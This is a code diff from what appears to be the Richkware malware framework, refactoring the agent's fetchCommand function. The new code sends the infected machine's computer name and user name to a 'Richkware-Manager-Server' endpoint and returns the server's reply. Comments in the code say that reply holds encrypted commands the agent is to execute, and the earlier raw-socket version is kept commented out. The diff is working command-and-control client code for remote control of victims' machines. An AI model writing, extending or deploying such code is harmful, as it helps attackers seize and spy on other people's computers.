@@ -162,20 +162,42 @@ bool Network::UploadInfoToRMS(const char *serverAddress, const char *port, const
 }
 
 std::string Network::fetchCommand(const char *serverAddress, const char *port) {
+
     Crypto crypto(encryptionKey);
     std::string device = getenv("COMPUTERNAME");
     device.append("/");
     device.append(getenv("USERNAME"));
 
-    std::string packet = "GET /Richkware-Manager-Server/command?data0=" + device +
-                         "&data1=agent" +
-                         " HTTP/1.1\r\n" +
-                         "Host: " + serverAddress + "\r\n" +
-                         "Connection: close\r\n" +
-                         "\r\n";
+    std::string srvAddr(serverAddress);
+    std::string prt(port);
 
-    std::string response = RawRequest(serverAddress, port,
-                                      packet.c_str()); //response è un JSON che contiene i comandi criptati da eseguire
+    http::Request request("http://" + srvAddr + ":" + prt + "/Richkware-Manager-Server/command");
+
+    std::string parameters = "{data0:\"" + device + "\",data1:\"agent\"}";
+
+    http::Response response = request.send("GET", parameters, {
+            "Content-Type: application/json"
+    });
+
+    if (std::string(response.body.begin(), response.body.end()).find("OK") != std::string::npos) {
+        return std::string(response.body.begin(), response.body.end());
+    }
+    return "";
+
+//    Crypto crypto(encryptionKey);
+//    std::string device = getenv("COMPUTERNAME");
+//    device.append("/");
+//    device.append(getenv("USERNAME"));
+//
+//    std::string packet = "GET /Richkware-Manager-Server/command?data0=" + device +
+//                         "&data1=agent" +
+//                         " HTTP/1.1\r\n" +
+//                         "Host: " + serverAddress + "\r\n" +
+//                         "Connection: close\r\n" +
+//                         "\r\n";
+//
+//    std::string response = RawRequest(serverAddress, port,
+//                                      packet.c_str()); //response è un JSON che contiene i comandi criptati da eseguire
     /*
      * JSON format returned by server:
      * {
@@ -190,23 +212,23 @@ std::string Network::fetchCommand(const char *serverAddress, const char *port) {
      * "command1##command2##commandN"
      * */
     //parse message from server
-    if (response.find("OK") != std::string::npos) {
-        std::string delimiter = "\"message\":\"";
-        std::string delimiter2 = "\"";
-
-        size_t pos = 0;
-        std::string token;
-        pos = response.find(delimiter);
-        response.erase(0, pos + delimiter.length());
-
-        std::string token2;
-        pos = response.find(delimiter2);
-        token = response.substr(0, pos);
-        return token;        //returns an encrypted string containing the commands to be executed
-    } else {
-        //TODO: manage KO from server
-        return "";
-    }
+//    if (response.find("OK") != std::string::npos) {
+//        std::string delimiter = "\"message\":\"";
+//        std::string delimiter2 = "\"";
+//
+//        size_t pos = 0;
+//        std::string token;
+//        pos = response.find(delimiter);
+//        response.erase(0, pos + delimiter.length());
+//
+//        std::string token2;
+//        pos = response.find(delimiter2);
+//        token = response.substr(0, pos);
+//        return token;        //returns an encrypted string containing the commands to be executed
+//    } else {
+//        //TODO: manage KO from server
+//        return "";
+//    }
 }
 
 bool Network::uploadCommand(std::string commandsOutput, const char *serverAddress, const char *port) {
